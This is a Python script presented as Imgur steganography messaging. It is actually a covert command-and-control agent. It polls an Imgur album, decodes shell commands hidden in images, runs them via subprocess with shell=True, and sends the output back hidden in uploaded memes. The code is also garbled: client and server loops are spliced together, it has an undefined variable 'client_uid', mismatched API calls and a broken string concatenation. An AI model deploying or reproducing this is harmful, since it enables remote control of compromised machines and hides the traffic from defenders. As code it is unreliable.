#!/usr/bin/env python
'''
Hide messages in Imgur images with Steganography
'''
import os
import sys
import ast
import time
import shlex
import base64
import random
import subprocess
import LSB_steganography as LSB
from imgurpython import ImgurClient

def get_input(string):
    try:
        return raw_input(string)
    except:
        return input(string)

def authenticate():
    client_id = '<REPLACE WITH YOUR IMGUR CLIENT ID>'
    client_secret = '<REPLACE WITH YOUR IMGUR CLIENT SECRET>'
    
    client = ImgurClient(client_id, client_secret)
    authorization_url = client.get_auth_url('pin')

    print('Go to the following URL: {}'.format(authorization_url))
    pin = get_input('Enter pin code: ')

    credentials = client.authorize(pin, 'pin')
    client.set_user_auth(credentials['access_token'],
                         credentials['refresh_token'])
    return client

client_uuid = 'test_client_1'
client = authenticate()
a = client.get_account_albums('<YOUR IMGUR USERNAME>')

imgs = client.get_album_image(a[0].id)
last_message_datetime = imgs[-1].datetime

steg_path = LSB.hide_message(random.choice(client.default_memes()).link,
                             "{'os':'" + os.name + "', 'uuid':'" + client_uuid + "','status':'ready'}", 
                             'Imgur1.png', True)

uploaded = client.upload_from_path(steg_path)
client.album_add_images(a[0].id, uploaded['id'])
last_message_datetime = uploaded['datetime']

while True:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict = ast.literal_eval(LSB.extract_message(imgs[-1].link, True))
        if client_dict['uuid'] == client_uuid:
            command = base64.b32decode(client_dict['command'])

            if command == 'quit':
                sys.exit(0)

            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = LSB.hide_message(random.choice(client.default_memes()).link,
                                         "{'os':'" + os.name + "', 'uuid':'" + client_uuid
                                         + "','status':'response','response':'" + 
                                         str(base64.b32encode(output)) + "'}","Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']

            client = authenticate()
            a = client.get_account_albums('<YOUR IMGUR ACCOUNT NAME>')

            imgs = client.get_album_images(a[0].id)
            last_message_datetime = imgs[-1].datetime

            print('Await client connection...')

            client_uuid = 'test_client_1'

            client = authenticate()
            a = client.get_account_albums('c2imgserver')

            imgs = client.get_album_images(a[0].id)
            last_message_datetime = imgs[-1].datetime

            steg_path = LSB.hide_message(random.choice(client.default_memes()).link,
                                         "{'os':'" + os.name + "','uuid':'" + client_id + 
                                         "','status':'ready'}", "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']

loop = True
while loop:
    time.sleep(5)
    imgs = client.get_album_images(a[0].id)
    if imgs[-1].datetime > last_message_datetime:
        last_message_datetime = imgs[-1].datetime
        client_dict = ast.literal_eval(LSB.extract_message(imgs[-1].link, True))
        if client_dict['status'] == 'ready':
            print('Client connected:\n')
            print('Client UUID:' + client_dict['uuid'])
            print('Client OS:' + client_dict['os'])
        if client_dict['uuid'] == client_uid:
            command = base64.b32decode(client_dict['command'])

            if command == 'quit':
                sys.exit(0)

            args = shlex.split(command)
            p = subprocess.Popen(args, stdout=subprocess.PIPE, shell=True)
            (output, err) = p.communicate()
            p_status = p.wait()

            steg_path = LSB.hide_message(random.choice(client.default_memes()).link,
                                         "{'os':'" + os.name + "', 'uuid':'" + 
                                         client_uuid + "','status':'response','response':'" + 
                                         + str(base64.b32encode(output)) + "'}", "Imgur1.png", True)
            uploaded = client.upload_from_path(steg_path)
            client.album_add_images(a[0].id, uploaded['id'])
            last_message_datetime = uploaded['datetime']
